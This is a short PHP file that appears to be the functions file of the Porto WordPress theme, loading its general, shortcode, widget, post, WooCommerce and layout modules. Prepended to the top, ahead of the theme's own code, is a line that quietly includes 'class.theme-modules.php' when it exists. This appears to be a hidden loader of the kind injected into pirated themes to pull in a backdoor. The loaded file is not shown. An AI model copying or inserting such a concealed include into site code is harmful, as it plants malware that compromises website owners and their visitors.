<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

require_once(porto_functions . '/general.php');
require_once(porto_functions . '/shortcodes.php');
require_once(porto_functions . '/widgets.php');
require_once(porto_functions . '/post.php');
if ( class_exists( 'WooCommerce' ) ) {
    require_once(porto_functions . '/woocommerce.php');
}

require_once(porto_functions . '/layout.php');
